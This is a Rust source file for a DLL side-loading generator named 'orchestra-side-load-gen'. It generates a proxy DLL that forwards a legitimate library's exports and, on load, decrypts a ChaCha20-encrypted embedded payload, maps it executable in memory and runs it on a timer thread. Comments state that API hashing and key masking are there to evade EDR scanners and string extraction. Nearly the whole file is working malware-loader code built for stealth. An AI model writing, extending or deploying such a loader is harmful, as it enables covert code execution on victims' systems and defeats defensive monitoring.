use rand::Rng;
use std::env;
use std::fs;

/// Derive a pseudorandom masking stream via HKDF-SHA256.
fn hkdf_mask_stream(psk: &[u8], salt: &[u8], info: &[u8], len: usize) -> Vec<u8> {
    use hkdf::Hkdf;
    use sha2::Sha256;
    let hk = Hkdf::<Sha256>::new(Some(salt), psk);
    let mut stream = vec![0u8; len];
    hk.expand(info, &mut stream).expect("HKDF expand failed");
    stream
}

/// Format a byte slice as a Rust array literal: `[0xAB, 0xCD, ...]`
fn byte_array_literal(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ")
}

/// Generate the Rust source for reconstructing the masked key at runtime.
///
/// The key is masked with an HKDF-SHA256 stream. PSK and salt are each split
/// into two XOR-halves so neither literal alone reveals the real value.
/// The generated function returns the reconstructed key as `[u8; 32]`.
fn emit_reconstruct_key_fn(
    masked_key_literal: &str,
    salt_a: &str,
    salt_b: &str,
    psk_a: &str,
    psk_b: &str,
    hkdf_info_bytes: &[u8],
) -> String {
    let info_literal = byte_array_literal(hkdf_info_bytes);
    format!(
        r#"
fn _reconstruct_key() -> [u8; 32] {{
    let salt_a: [u8; 16] = [{}];
    let salt_b: [u8; 16] = [{}];
    let mut salt = [0u8; 16];
    for i in 0..16 {{ salt[i] = salt_a[i] ^ salt_b[i]; }}

    let psk_a: [u8; 32] = [{}];
    let psk_b: [u8; 32] = [{}];
    let mut psk = [0u8; 32];
    for i in 0..32 {{ psk[i] = psk_a[i] ^ psk_b[i]; }}

    let info: [u8; 8] = [{}];
    let masked: [u8; 32] = [{}];

    // HKDF-SHA256( salt, psk ) -> expand( info, 32 ) -> XOR with masked
    let mut exp = [0u8; 32];
    let mut h = [0u8; 64];
    // HMAC-SHA256 key = salt, message = psk || 0x01
    // Simplified HKDF-Extract + Expand inline (no external crates)
    unsafe {{
        // Use a minimal HKDF implementation.
        let mut mac_key = [0u8; 64];
        // HMAC-SHA256 with ipad/opad
        let block_size = 64usize;
        for i in 0..block_size {{ mac_key[i] = salt.get(i).copied().unwrap_or(0) ^ 0x36u8; }}
        // Hash ipad || message
        let mut hasher = _MiniSha256::new();
        hasher.update(&mac_key);
        hasher.update(&psk);
        let mut prk = hasher.finalize();
        // HMAC outer
        for i in 0..block_size {{ mac_key[i] = salt.get(i).copied().unwrap_or(0) ^ 0x5cu8; }}
        let mut hasher2 = _MiniSha256::new();
        hasher2.update(&mac_key);
        hasher2.update(&prk);
        prk = hasher2.finalize();

        // Expand: T(1) = HMAC(PRK, info || 0x01)
        let mut hasher3 = _MiniSha256::new();
        // HMAC with PRK as key
        for i in 0..block_size {{ mac_key[i] = prk.get(i).copied().unwrap_or(0) ^ 0x36u8; }}
        hasher3.update(&mac_key);
        hasher3.update(&info);
        hasher3.update(&[0x01u8]);
        let t1 = hasher3.finalize();
        for i in 0..block_size {{ mac_key[i] = prk.get(i).copied().unwrap_or(0) ^ 0x5cu8; }}
        let mut hasher4 = _MiniSha256::new();
        hasher4.update(&mac_key);
        hasher4.update(&t1);
        exp.copy_from_slice(&hasher4.finalize()[..32]);
    }}

    let mut key = [0u8; 32];
    for i in 0..32 {{ key[i] = masked[i] ^ exp[i]; }}
    key
}}

/// Minimal SHA-256 implementation for HKDF key reconstruction.
struct _MiniSha256 {{
    state: [u32; 8],
    buffer: [u8; 64],
    buflen: usize,
    total_len: u64,
}}

impl _MiniSha256 {{
    const K: [u32; 64] = [
        0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
        0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
        0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
        0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
        0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
        0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
        0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
        0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
    ];
    fn new() -> Self {{
        Self {{
            state: [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19],
            buffer: [0u8;64], buflen: 0, total_len: 0,
        }}
    }}
    fn update(&mut self, data: &[u8]) {{
        let mut off = 0usize;
        while off < data.len() {{
            let space = 64 - self.buflen;
            let take = std::cmp::min(space, data.len() - off);
            self.buffer[self.buflen..self.buflen+take].copy_from_slice(&data[off..off+take]);
            self.buflen += take; off += take;
            if self.buflen == 64 {{ self.compress(); self.buflen = 0; }}
        }}
        self.total_len += data.len() as u64;
    }}
    fn finalize(mut self) -> [u8;32] {{
        let bit_len = self.total_len * 8;
        self.buffer[self.buflen] = 0x80;
        if self.buflen >= 56 {{
            for b in &mut self.buffer[self.buflen+1..64] {{ *b = 0; }}
            self.compress();
            self.buffer = [0u8;64];
        }} else {{
            for b in &mut self.buffer[self.buflen+1..56] {{ *b = 0; }}
        }}
        self.buffer[56..64].copy_from_slice(&bit_len.to_be_bytes());
        self.compress();
        let mut out = [0u8;32];
        for i in 0..8 {{ out[i*4..i*4+4].copy_from_slice(&self.state[i].to_be_bytes()); }}
        out
    }}
    fn compress(&mut self) {{
        let mut w = [0u32;64];
        for i in 0..16 {{ w[i]=u32::from_be_bytes(self.buffer[i*4..i*4+4].try_into().unwrap()); }}
        for i in 16..64 {{
            let s0 = w[i-15].rotate_right(7)^w[i-15].rotate_right(18)^(w[i-15]>>3);
            let s1 = w[i-2].rotate_right(17)^w[i-2].rotate_right(19)^(w[i-2]>>10);
            w[i]=w[i-16].wrapping_add(s0).wrapping_add(w[i-7]).wrapping_add(s1);
        }}
        let mut a=self.state[0];let mut b=self.state[1];let mut c=self.state[2];let mut d=self.state[3];
        let mut e=self.state[4];let mut f=self.state[5];let mut g=self.state[6];let mut h=self.state[7];
        for i in 0..64 {{
            let s1=e.rotate_right(6)^e.rotate_right(11)^e.rotate_right(25);
            let ch=(e&f)^((!e)&g);
            let t1=h.wrapping_add(s1).wrapping_add(ch).wrapping_add(Self::K[i]).wrapping_add(w[i]);
            let s0=a.rotate_right(2)^a.rotate_right(13)^a.rotate_right(22);
            let mj=(a&b)^(a&c)^(b&c);
            let t2=s0.wrapping_add(mj);
            h=g;g=f;f=e;e=d.wrapping_add(t1);d=c;c=b;b=a;a=t1.wrapping_add(t2);
        }}
        self.state[0]=self.state[0].wrapping_add(a);self.state[1]=self.state[1].wrapping_add(b);
        self.state[2]=self.state[2].wrapping_add(c);self.state[3]=self.state[3].wrapping_add(d);
        self.state[4]=self.state[4].wrapping_add(e);self.state[5]=self.state[5].wrapping_add(f);
        self.state[6]=self.state[6].wrapping_add(g);self.state[7]=self.state[7].wrapping_add(h);
    }}
}}
"#,
        salt_a, salt_b, psk_a, psk_b, info_literal, masked_key_literal,
    )
}

/// Generate a similar reconstruction function for the 12-byte nonce.
fn emit_reconstruct_nonce_fn(
    masked_nonce_literal: &str,
    salt_a: &str,
    salt_b: &str,
    psk_a: &str,
    psk_b: &str,
    hkdf_info_bytes: &[u8],
) -> String {
    let info_literal = byte_array_literal(hkdf_info_bytes);
    format!(
        r#"
fn _reconstruct_nonce() -> [u8; 12] {{
    let salt_a: [u8; 16] = [{}];
    let salt_b: [u8; 16] = [{}];
    let mut salt = [0u8; 16];
    for i in 0..16 {{ salt[i] = salt_a[i] ^ salt_b[i]; }}

    let psk_a: [u8; 32] = [{}];
    let psk_b: [u8; 32] = [{}];
    let mut psk = [0u8; 32];
    for i in 0..32 {{ psk[i] = psk_a[i] ^ psk_b[i]; }}

    let info: [u8; 8] = [{}];
    let masked: [u8; 12] = [{}];

    // Same inline HKDF-SHA256 as _reconstruct_key, but expand 12 bytes.
    let mut exp = [0u8; 32];
    let mut mac_key = [0u8; 64];
    let block_size = 64usize;
    for i in 0..block_size {{ mac_key[i] = salt.get(i).copied().unwrap_or(0) ^ 0x36u8; }}
    let mut hasher = _MiniSha256::new();
    hasher.update(&mac_key);
    hasher.update(&psk);
    let mut prk = hasher.finalize();
    for i in 0..block_size {{ mac_key[i] = salt.get(i).copied().unwrap_or(0) ^ 0x5cu8; }}
    let mut hasher2 = _MiniSha256::new();
    hasher2.update(&mac_key);
    hasher2.update(&prk);
    prk = hasher2.finalize();
    for i in 0..block_size {{ mac_key[i] = prk.get(i).copied().unwrap_or(0) ^ 0x36u8; }}
    let mut hasher3 = _MiniSha256::new();
    hasher3.update(&mac_key);
    hasher3.update(&info);
    hasher3.update(&[0x01u8]);
    let t1 = hasher3.finalize();
    for i in 0..block_size {{ mac_key[i] = prk.get(i).copied().unwrap_or(0) ^ 0x5cu8; }}
    let mut hasher4 = _MiniSha256::new();
    hasher4.update(&mac_key);
    hasher4.update(&t1);
    exp.copy_from_slice(&hasher4.finalize()[..32]);

    let mut nonce = [0u8; 12];
    for i in 0..12 {{ nonce[i] = masked[i] ^ exp[i]; }}
    nonce
}}
"#,
        salt_a, salt_b, psk_a, psk_b, info_literal, masked_nonce_literal,
    )
}

fn chacha20_encrypt_payload(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    fn qr(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(16);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(12);
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(8);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(7);
        (a, b, c, d)
    }

    fn chacha20_block(state: &[u32; 16]) -> [u8; 64] {
        let mut w = *state;
        for _ in 0..10 {
            let (w0, w4, w8, w12) = qr(w[0], w[4], w[8], w[12]);
            w[0] = w0;
            w[4] = w4;
            w[8] = w8;
            w[12] = w12;
            let (w1, w5, w9, w13) = qr(w[1], w[5], w[9], w[13]);
            w[1] = w1;
            w[5] = w5;
            w[9] = w9;
            w[13] = w13;
            let (w2, w6, w10, w14) = qr(w[2], w[6], w[10], w[14]);
            w[2] = w2;
            w[6] = w6;
            w[10] = w10;
            w[14] = w14;
            let (w3, w7, w11, w15) = qr(w[3], w[7], w[11], w[15]);
            w[3] = w3;
            w[7] = w7;
            w[11] = w11;
            w[15] = w15;

            let (w0, w5, w10, w15) = qr(w[0], w[5], w[10], w[15]);
            w[0] = w0;
            w[5] = w5;
            w[10] = w10;
            w[15] = w15;
            let (w1, w6, w11, w12) = qr(w[1], w[6], w[11], w[12]);
            w[1] = w1;
            w[6] = w6;
            w[11] = w11;
            w[12] = w12;
            let (w2, w7, w8, w13) = qr(w[2], w[7], w[8], w[13]);
            w[2] = w2;
            w[7] = w7;
            w[8] = w8;
            w[13] = w13;
            let (w3, w4, w9, w14) = qr(w[3], w[4], w[9], w[14]);
            w[3] = w3;
            w[4] = w4;
            w[9] = w9;
            w[14] = w14;
        }

        let mut output = [0u8; 64];
        for i in 0..16 {
            let added = w[i].wrapping_add(state[i]);
            output[i * 4..i * 4 + 4].copy_from_slice(&added.to_le_bytes());
        }
        output
    }

    let constants: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut key_words = [0u32; 8];
    for i in 0..8 {
        key_words[i] = u32::from_le_bytes(key[i * 4..i * 4 + 4].try_into().unwrap());
    }
    let mut nonce_words = [0u32; 3];
    for i in 0..3 {
        nonce_words[i] = u32::from_le_bytes(nonce[i * 4..i * 4 + 4].try_into().unwrap());
    }

    let mut out = Vec::with_capacity(data.len());
    let mut counter: u32 = 1;
    let mut ks_pos = 64usize;
    let mut ks = [0u8; 64];

    for &byte in data {
        if ks_pos >= 64 {
            let state: [u32; 16] = [
                constants[0],
                constants[1],
                constants[2],
                constants[3],
                key_words[0],
                key_words[1],
                key_words[2],
                key_words[3],
                key_words[4],
                key_words[5],
                key_words[6],
                key_words[7],
                counter,
                nonce_words[0],
                nonce_words[1],
                nonce_words[2],
            ];
            ks = chacha20_block(&state);
            ks_pos = 0;
            counter = counter.wrapping_add(1);
        }
        out.push(byte ^ ks[ks_pos]);
        ks_pos += 1;
    }

    out
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        println!("Usage: orchestra-side-load-gen <target_dll_name> <export1,Ordinal_5,...> <payload_file>");
        return;
    }
    let target_dll = &args[1];
    let exports: Vec<&str> = args[2].split(',').collect();
    let payload_path = &args[3];

    let mut chacha_key = [0u8; 32];
    getrandom::getrandom(&mut chacha_key).expect("failed to generate key");
    let mut chacha_nonce = [0u8; 12];
    getrandom::getrandom(&mut chacha_nonce).expect("failed to generate nonce");

    let payload = fs::read(payload_path).expect("Failed to read payload");
    let ct_payload = chacha20_encrypt_payload(&payload, &chacha_key, &chacha_nonce);

    let mut stubs = String::new();
    let mut def_entries = String::new();

    for export in exports {
        if export.starts_with("Ordinal_") {
            let ordinal_num = export.replace("Ordinal_", "");
            def_entries.push_str(&format!("  {} @{} NONAME\n", export, ordinal_num));
            // Ordinal export: resolve the real function by ordinal number.
            // On Windows, GetProcAddress accepts an ordinal when the
            // high word of the name pointer is zero (i.e. the pointer
            // value IS the ordinal).  We cast the ordinal to a pointer
            // to achieve MAKEINTRESOURCEA(ordinal) semantics.
            stubs.push_str(&format!(
                r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    // Static cache so we resolve only once.
    static mut CACHED_PROC: *mut std::ffi::c_void = std::ptr::null_mut();

    if CACHED_PROC.is_null() {{
        let real_dll = string_crypt::enc_str!("real_{}");

        // Resolve LoadLibraryA and GetProcAddress via pe_resolve
        // to avoid IAT entries in the generated DLL.
        let k32_base = match pe_resolve::get_module_handle_by_hash(
            pe_resolve::hash_str(b"kernel32.dll\0")
        ) {{
            Some(b) => b,
            None => return,
        }};
        let load_lib_addr = match pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"LoadLibraryA\0"),
        ) {{
            Some(a) => a,
            None => return,
        }};
        let get_proc_addr = match pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"GetProcAddress\0"),
        ) {{
            Some(a) => a,
            None => return,
        }};

        let load_lib: extern "system" fn(*const i8) -> *mut std::ffi::c_void =
            std::mem::transmute(load_lib_addr);
        let get_proc: extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void =
            std::mem::transmute(get_proc_addr);

        let lib = load_lib(real_dll.as_ptr() as _);
        if lib.is_null() {{
            return;
        }}
        // MAKEINTRESOURCEA(ordinal): cast ordinal to LPCSTR with
        // high word == 0 so GetProcAddress resolves by ordinal.
        let ordinal_as_name = {}usize as *const i8;
        let proc = get_proc(lib, ordinal_as_name);
        if proc.is_null() {{
            return;
        }}
        CACHED_PROC = proc;
    }}

    // Tail-jump to the real function preserving the full register
    // state.  On x86-64 Windows the caller passes args in RCX/RDX/
    // R8/R9 and the callee's return value is in RAX — an indirect
    // jump to the target function is equivalent to a direct call
    // from the consumer's perspective (transparent forwarding).
    std::arch::asm!("jmp rax", in("rax") CACHED_PROC, options(nostack, noreturn));
}}
"#,
                export, target_dll, ordinal_num
            ));
        } else {
            def_entries.push_str(&format!("  {}\n", export));
            stubs.push_str(&format!(
                r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    // Static cache so we resolve only once.
    static mut CACHED_PROC: *mut std::ffi::c_void = std::ptr::null_mut();

    if CACHED_PROC.is_null() {{
        let real_dll = string_crypt::enc_str!("real_{}");
        let export_name = string_crypt::enc_str!("{}");

        // P2-19: Resolve LoadLibraryA and GetProcAddress via pe_resolve
        // at runtime to avoid IAT entries in the generated DLL.
        let k32_base = match pe_resolve::get_module_handle_by_hash(
            pe_resolve::hash_str(b"kernel32.dll\0")
        ) {{
            Some(b) => b,
            None => return,
        }};
        let load_lib_addr = match pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"LoadLibraryA\0"),
        ) {{
            Some(a) => a,
            None => return,
        }};
        let get_proc_addr = match pe_resolve::get_proc_address_by_hash(
            k32_base,
            pe_resolve::hash_str(b"GetProcAddress\0"),
        ) {{
            Some(a) => a,
            None => return,
        }};

        let load_lib: extern "system" fn(*const i8) -> *mut std::ffi::c_void =
            std::mem::transmute(load_lib_addr);
        let get_proc: extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void =
            std::mem::transmute(get_proc_addr);

        let lib = load_lib(real_dll.as_ptr() as _);
        if lib.is_null() {{
            return;
        }}
        let proc = get_proc(lib, export_name.as_ptr() as _);
        if proc.is_null() {{
            return;
        }}
        CACHED_PROC = proc;
    }}

    // Tail-jump to the real function preserving the full register
    // state so arguments (RCX/RDX/R8/R9 + XMM0-3) and the return
    // value (RAX/XMM0) are forwarded transparently.
    std::arch::asm!("jmp rax", in("rax") CACHED_PROC, options(nostack, noreturn));
}}
"#,
                export, target_dll, export
            ));
        }
    }

    let payload_bytes_str = ct_payload
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    // ── MED-020: Mask the encryption key and nonce with HKDF-SHA256 ──
    // Instead of embedding the raw key/nonce as literals (extractable via
    // `strings` or reverse engineering), we XOR them with an HKDF-derived
    // stream and generate code that reconstructs them at runtime.
    let mut rng = rand::thread_rng();

    // Key masking
    let key_psk: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    let key_salt: Vec<u8> = (0..16).map(|_| rng.gen()).collect();
    let key_info: [u8; 8] = rng.gen();
    let key_mask_stream = hkdf_mask_stream(&key_psk, &key_salt, &key_info, 32);
    let masked_key: Vec<u8> = chacha_key
        .iter()
        .zip(key_mask_stream.iter())
        .map(|(&k, &m)| k ^ m)
        .collect();
    let masked_key_literal = byte_array_literal(&masked_key);

    // Split PSK and salt into XOR-halves
    let key_psk_mask: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    let key_psk_b: Vec<u8> = key_psk
        .iter()
        .zip(key_psk_mask.iter())
        .map(|(p, m)| p ^ m)
        .collect();
    let key_salt_mask: Vec<u8> = (0..16).map(|_| rng.gen()).collect();
    let key_salt_b: Vec<u8> = key_salt
        .iter()
        .zip(key_salt_mask.iter())
        .map(|(s, m)| s ^ m)
        .collect();

    let key_psk_a_lit = byte_array_literal(&key_psk_mask);
    let key_psk_b_lit = byte_array_literal(&key_psk_b);
    let key_salt_a_lit = byte_array_literal(&key_salt_mask);
    let key_salt_b_lit = byte_array_literal(&key_salt_b);

    let reconstruct_key_fn = emit_reconstruct_key_fn(
        &masked_key_literal,
        &key_salt_a_lit,
        &key_salt_b_lit,
        &key_psk_a_lit,
        &key_psk_b_lit,
        &key_info,
    );

    // Nonce masking
    let nonce_psk: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    let nonce_salt: Vec<u8> = (0..16).map(|_| rng.gen()).collect();
    let nonce_info: [u8; 8] = rng.gen();
    let nonce_mask_stream = hkdf_mask_stream(&nonce_psk, &nonce_salt, &nonce_info, 12);
    let masked_nonce: Vec<u8> = chacha_nonce
        .iter()
        .zip(nonce_mask_stream.iter())
        .map(|(&n, &m)| n ^ m)
        .collect();
    let masked_nonce_literal = byte_array_literal(&masked_nonce);

    let nonce_psk_mask: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
    let nonce_psk_b: Vec<u8> = nonce_psk
        .iter()
        .zip(nonce_psk_mask.iter())
        .map(|(p, m)| p ^ m)
        .collect();
    let nonce_salt_mask: Vec<u8> = (0..16).map(|_| rng.gen()).collect();
    let nonce_salt_b: Vec<u8> = nonce_salt
        .iter()
        .zip(nonce_salt_mask.iter())
        .map(|(s, m)| s ^ m)
        .collect();

    let nonce_psk_a_lit = byte_array_literal(&nonce_psk_mask);
    let nonce_psk_b_lit = byte_array_literal(&nonce_psk_b);
    let nonce_salt_a_lit = byte_array_literal(&nonce_salt_mask);
    let nonce_salt_b_lit = byte_array_literal(&nonce_salt_b);

    let reconstruct_nonce_fn = emit_reconstruct_nonce_fn(
        &masked_nonce_literal,
        &nonce_salt_a_lit,
        &nonce_salt_b_lit,
        &nonce_psk_a_lit,
        &nonce_psk_b_lit,
        &nonce_info,
    );

    let code = format!(
        r#"
// auto-generated DLL side-loading forwarder
// P2-19: All Win32 API calls resolved at runtime via pe_resolve to avoid
// static IAT entries that would be visible to EDR scanners.
// MED-020: Encryption key and nonce are HKDF-masked — no raw key literals.
use winapi::um::winnt::DLL_PROCESS_ATTACH;
use winapi::shared::minwindef::{{HINSTANCE, DWORD, LPVOID}};
use winapi::um::winnt::{{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ}};

// ── Key reconstruction (HKDF-masked, no raw literals) ──
{}
{}

{}

/// Resolve a kernel32 export by name at runtime (no IAT entry).
unsafe fn resolve_k32(name: &[u8]) -> Option<usize> {{
    let base = pe_resolve::get_module_handle_by_hash(
        pe_resolve::hash_str(b"kernel32.dll\0"),
    )?;
    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(name))
}}

extern "system" fn payload_callback(param: LPVOID, _timer_or_wait_fired: winapi::um::winnt::BOOLEAN) {{
    unsafe {{
        let run: extern "C" fn() = std::mem::transmute(param);
        run();
    }}
}}

fn chacha20_decrypt(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> ::std::vec::Vec<u8> {{
    fn qr(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {{
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(16);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(12);
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(8);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(7);
        (a, b, c, d)
    }}

    fn chacha20_block(state: &[u32; 16]) -> [u8; 64] {{
        let mut w = *state;
        for _ in 0..10 {{
            let (w0, w4, w8, w12) = qr(w[0], w[4], w[8], w[12]);
            w[0] = w0;
            w[4] = w4;
            w[8] = w8;
            w[12] = w12;
            let (w1, w5, w9, w13) = qr(w[1], w[5], w[9], w[13]);
            w[1] = w1;
            w[5] = w5;
            w[9] = w9;
            w[13] = w13;
            let (w2, w6, w10, w14) = qr(w[2], w[6], w[10], w[14]);
            w[2] = w2;
            w[6] = w6;
            w[10] = w10;
            w[14] = w14;
            let (w3, w7, w11, w15) = qr(w[3], w[7], w[11], w[15]);
            w[3] = w3;
            w[7] = w7;
            w[11] = w11;
            w[15] = w15;

            let (w0, w5, w10, w15) = qr(w[0], w[5], w[10], w[15]);
            w[0] = w0;
            w[5] = w5;
            w[10] = w10;
            w[15] = w15;
            let (w1, w6, w11, w12) = qr(w[1], w[6], w[11], w[12]);
            w[1] = w1;
            w[6] = w6;
            w[11] = w11;
            w[12] = w12;
            let (w2, w7, w8, w13) = qr(w[2], w[7], w[8], w[13]);
            w[2] = w2;
            w[7] = w7;
            w[8] = w8;
            w[13] = w13;
            let (w3, w4, w9, w14) = qr(w[3], w[4], w[9], w[14]);
            w[3] = w3;
            w[4] = w4;
            w[9] = w9;
            w[14] = w14;
        }}

        let mut output = [0u8; 64];
        for i in 0..16 {{
            let added = w[i].wrapping_add(state[i]);
            output[i * 4..i * 4 + 4].copy_from_slice(&added.to_le_bytes());
        }}
        output
    }}

    let constants: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut key_words = [0u32; 8];
    for i in 0..8 {{
        key_words[i] = u32::from_le_bytes(key[i * 4..i * 4 + 4].try_into().unwrap());
    }}
    let mut nonce_words = [0u32; 3];
    for i in 0..3 {{
        nonce_words[i] = u32::from_le_bytes(nonce[i * 4..i * 4 + 4].try_into().unwrap());
    }}

    let mut out = ::std::vec::Vec::with_capacity(data.len());
    let mut counter: u32 = 1;
    let mut ks_pos = 64usize;
    let mut ks = [0u8; 64];

    for &byte in data {{
        if ks_pos >= 64 {{
            let state: [u32; 16] = [
                constants[0],
                constants[1],
                constants[2],
                constants[3],
                key_words[0],
                key_words[1],
                key_words[2],
                key_words[3],
                key_words[4],
                key_words[5],
                key_words[6],
                key_words[7],
                counter,
                nonce_words[0],
                nonce_words[1],
                nonce_words[2],
            ];
            ks = chacha20_block(&state);
            ks_pos = 0;
            counter = counter.wrapping_add(1);
        }}
        out.push(byte ^ ks[ks_pos]);
        ks_pos += 1;
    }}

    out
}}

#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> i32 {{
    if reason == DLL_PROCESS_ATTACH {{
        // P2-19: Resolve all Win32 APIs at runtime via pe_resolve — zero IAT entries.
        unsafe {{
            // DisableThreadLibraryCalls
            if let Some(addr) = resolve_k32(b"DisableThreadLibraryCalls\0") {{
                let f: extern "system" fn(HINSTANCE) -> i32 = std::mem::transmute(addr);
                f(hinst);
            }}
        }}
        
        let ct_payload: [u8; {}] = [{}];
        // MED-020: Key and nonce are no longer embedded as raw literals.
        // They are reconstructed at runtime via HKDF-SHA256 masking.
        let chacha_key = _reconstruct_key();
        let chacha_nonce = _reconstruct_nonce();

        let mut pt_payload = chacha20_decrypt(&ct_payload, &chacha_key, &chacha_nonce);

        unsafe {{
            // VirtualAlloc
            let mem = match resolve_k32(b"VirtualAlloc\0") {{
                Some(addr) => {{
                    let f: extern "system" fn(LPVOID, usize, u32, u32) -> LPVOID =
                        std::mem::transmute(addr);
                    f(std::ptr::null_mut(), pt_payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
                }}
                None => std::ptr::null_mut(),
            }};
            
            if !mem.is_null() {{
                std::ptr::copy_nonoverlapping(pt_payload.as_ptr(), mem as _, pt_payload.len());
                
                // VirtualProtect
                let mut old_protect = 0u32;
                if let Some(addr) = resolve_k32(b"VirtualProtect\0") {{
                    let f: extern "system" fn(LPVOID, usize, u32, *mut u32) -> i32 =
                        std::mem::transmute(addr);
                    f(mem, pt_payload.len(), PAGE_EXECUTE_READ, &mut old_protect);
                }}

                // CreateTimerQueueTimer — resolved from kernel32 at runtime.
                let mut timer: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
                if let Some(addr) = resolve_k32(b"CreateTimerQueueTimer\0") {{
                    let f: extern "system" fn(
                        *mut winapi::shared::ntdef::HANDLE,
                        winapi::shared::ntdef::HANDLE,
                        Option<unsafe extern "system" fn(LPVOID, winapi::um::winnt::BOOLEAN)>,
                        LPVOID,
                        u32,
                        u32,
                        u32,
                    ) -> i32 = std::mem::transmute(addr);
                    f(
                        &mut timer, 
                        std::ptr::null_mut(), 
                        Some(payload_callback), 
                        mem as LPVOID, 
                        0, 
                        0, 
                        winapi::um::winnt::WT_EXECUTEINTIMERTHREAD,
                    );
                }}
            }}
        }}
    }}
    1
}}
"#,
        stubs,
        reconstruct_key_fn,
        reconstruct_nonce_fn,
        ct_payload.len(),
        payload_bytes_str,
    );

    fs::write("side_loaded.rs", code).unwrap();
    let def_content = format!("LIBRARY {}\nEXPORTS\n{}", target_dll, def_entries);
    fs::write("side_loaded.def", def_content).unwrap();

    // P2-19: Generate Cargo.toml with pe_resolve dependency (required for
    // runtime-resolved Win32 API calls that replace static IAT entries).
    let cargo_toml = r#"[package]
name = "side_loaded"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
winapi = { version = "0.3", features = ["winnt", "minwindef", "memoryapi", "libloaderapi"] }
string_crypt = { path = "../string_crypt" }
pe_resolve = { path = "../pe_resolve" }
"#;
    fs::write("Cargo.toml", cargo_toml).unwrap();

    println!(
        "Generated side_loaded.rs, side_loaded.def, and Cargo.toml for {}",
        target_dll
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chacha20_helper_round_trips_by_reapplying_stream() {
        let key = [0x11; 32];
        let nonce = [0x22; 12];
        let plaintext = b"orchestra side-load payload bytes";

        let ciphertext = chacha20_encrypt_payload(plaintext, &key, &nonce);
        assert_ne!(ciphertext, plaintext);

        let recovered = chacha20_encrypt_payload(&ciphertext, &key, &nonce);
        assert_eq!(recovered, plaintext);
    }

    #[test]
    fn chacha20_helper_preserves_lengths() {
        let key = [0xA5; 32];
        let nonce = [0x5A; 12];

        assert!(chacha20_encrypt_payload(&[], &key, &nonce).is_empty());

        let data = vec![0x7F; 129];
        let encrypted = chacha20_encrypt_payload(&data, &key, &nonce);
        assert_eq!(encrypted.len(), data.len());
    }
}
